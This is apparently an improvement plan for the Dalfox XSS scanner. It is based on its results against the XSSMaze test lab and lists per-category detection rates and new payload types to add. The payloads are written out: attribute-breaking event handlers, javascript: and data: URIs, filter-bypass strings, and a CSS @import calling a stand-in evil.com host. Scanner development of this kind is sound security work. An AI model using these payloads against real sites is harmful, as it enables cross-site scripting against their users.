# Dalfox v3 Improvement Plan (Based on XSSMaze Testing)

## Test Results Summary

**Overall Detection Rate: 50/104 (48.1%)**

| Category | Detected | Total | Rate | Notes |
|----------|----------|-------|------|-------|
| basic | 7 | 7 | 100% | All levels passed |
| injs | 6 | 6 | 100% | All JS context levels passed |
| svg | 6 | 6 | 100% | All SVG levels passed |
| csp | 5 | 5 | 100% | All CSP bypass levels passed |
| websocket | 5 | 5 | 100% | All websocket levels passed |
| advanced | 6 | 6 | 100% | All advanced levels passed |
| template | 5 | 6 | 83% | level6 missed (script tag filter) |
| path | 3 | 4 | 75% | level3 missed (space filtering) |
| json | 3 | 6 | 50% | level1-3 skipped (content-type check) |
| inattr | 2 | 6 | 33% | level3-6 missed (angle bracket removal) |
| hidden | 1 | 3 | 33% | level2-3 missed (angle bracket removal) |
| css | 1 | 6 | 17% | Only level6 detected |
| header | 0 | 4 | 0% | Reflection found but no XSS payloads delivered |
| post | 0 | 2 | 0% | Reflection found but payload delivery failed |
| eventhandler | 0 | 5 | 0% | Needs event handler injection without new tags |
| redirect | 0 | 4 | 0% | No reflection found (redirect context) |
| decode | 0 | 4 | 0% | Encoded payloads not attempted |
| inframe | 0 | 4 | 0% | iframe src context not exploited |
| jf | 0 | 1 | 0% | Alphabetic filter bypass not attempted |
| dom | 0 | 35 | 0% | Client-side only - no headless browser |

---

## Priority 1: High Impact, Feasible Improvements

### 1. Attribute Context Event Handler Payloads (inattr 3-6, eventhandler 1-5, hidden 2-3)
**Impact: +13 detections**

When `<` and `>` are filtered but the injection is inside an HTML attribute, dalfox should generate event handler payloads that break out of the attribute and add event handlers without creating new tags.

**Current gap**: Payloads try to inject new HTML tags (`<img>`, `<svg>`) but don't try breaking attribute context with event handlers.

**Fix**: Add payloads like:
- `" onfocus=alert(1) autofocus="`  (double-quote attr context)
- `' onfocus=alert(1) autofocus='`  (single-quote attr context)
- `" onmouseover=alert(1) "`
- Tab/newline separated: `"%09onfocus=alert(1)%09autofocus="`

For event handler levels where common handlers are blocked, add rare event handlers:
- `ontoggle`, `onpointerenter`, `oncontextmenu`, `onauxclick`, `onwheel`
- `onbeforeinput`, `onsecuritypolicyviolation`, `onscrollend`

### 2. Header Injection XSS Verification (header 1-4)
**Impact: +4 detections**

Dalfox correctly identifies reflection in headers (Referer, User-Agent, Authorization, Cookie) but fails to confirm XSS. The scanning phase sends payloads but doesn't verify them properly in the response.

**Fix**: Ensure that when a header parameter is identified as reflected, the XSS payloads are injected via the same header and the response is checked for unencoded reflection.

### 3. POST Body XSS (post 1-2)
**Impact: +2 detections**

POST parameters are reflected but payloads aren't being delivered correctly. This may be a content-type or body encoding issue.

**Fix**: Verify POST body payload injection works correctly for both form-encoded and JSON content types.

### 4. JSON/JSONP Content-Type Handling (json 1-3)
**Impact: +3 detections**

JSON levels 1-3 return `application/json` content-type, causing dalfox to skip them at preflight. However, JSONP callbacks can still lead to XSS when loaded in a `<script>` tag context.

**Fix**: Add option to scan JSONP endpoints even when content-type is JSON. Detect JSONP callback patterns and generate callback-based XSS payloads.

### 5. iframe/src Attribute XSS (inframe 1-4)
**Impact: +4 detections**

Reflection detected in iframe src attribute but no `javascript:` protocol payloads generated.

**Fix**: When injection context is detected as an iframe/embed/object src attribute, add payloads:
- `javascript:alert(1)`
- `javascript:alert(1)//` (with comment to close src)
- `data:text/html,<script>alert(1)</script>`
- `jaVasCript:alert(1)` (case bypass)

---

## Priority 2: Medium Impact Improvements

### 6. Encoded Payload Variants (decode 1-4)
**Impact: +4 detections**

Dalfox doesn't try base64 or double-URL-encoded payloads.

**Fix**: Add encoding-aware scanning:
- Detect base64-decoded reflection (send base64-encoded payload)
- Detect double-URL-decoded reflection
- Add encoder: `base64`, `2url` (double URL encode)

### 7. Open Redirect / javascript: Protocol Detection (redirect 1-4)
**Impact: +4 detections**

Redirect endpoints don't show reflection in the response body (they redirect via header). Dalfox finds 0 reflected params.

**Fix**: Detect `Location` header reflection and test for `javascript:` protocol injection in redirect contexts. Also test for `data:` protocol.

### 8. CSS Injection Payloads (css 1-5)
**Impact: +5 detections**

CSS context injection is not covered by current payload set.

**Fix**: Add CSS-specific payloads when injection is detected in `<style>` tag or `style` attribute:
- `</style><script>alert(1)</script>`
- `expression(alert(1))` (legacy IE)
- `url(javascript:alert(1))`
- `@import 'http://evil.com/xss.css'`

### 9. Path Parameter Space/Encoding Handling (path 3)
**Impact: +1 detection**

Path level 3 removes spaces and `%20`. Payloads need alternatives:
- Tab (`%09`), newline (`%0a`), form feed (`%0c`) as whitespace alternatives

### 10. JSFuck/Non-Alpha Payloads (jf 1)
**Impact: +1 detection**

When alphabetic characters are filtered, use JSFuck-style payloads.

**Fix**: Detect alpha filtering and use payloads like:
- `[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()`

---

## Priority 3: Long-term / Architecture Improvements

### 11. DOM XSS Detection Enhancement (dom 1-35)
**Impact: +35 potential detections**

All 35 DOM levels missed. Current AST analysis detects source-to-sink flows in static JS but cannot detect runtime DOM XSS without JS execution.

**Options**:
- **Short-term**: Improve static AST analysis to detect inline JS patterns like `document.write(location.*)`, `innerHTML = location.*`
- **Long-term**: Integrate headless browser (Chrome DevTools Protocol) for runtime DOM XSS verification
- **Medium-term**: Add heuristic-based DOM XSS reporting based on JS pattern matching in response

### 12. Template Injection with Script Tag Filtering (template 6)
**Impact: +1 detection**

Template level 6 filters `<script>` tags. Need payloads that avoid script tags:
- `<img src=x onerror=alert(1)>`
- `<svg/onload=alert(1)>`

---

## Implementation Order

1. **Attribute context event handler payloads** (biggest impact: +13)
2. **Header injection verification** (+4)
3. **iframe src javascript: protocol** (+4)
4. **Encoded payload variants** (+4)
5. **Redirect javascript: protocol** (+4)
6. **CSS injection payloads** (+5)
7. **JSON/JSONP handling** (+3)
8. **POST body fix** (+2)
9. **DOM XSS heuristics** (long-term)
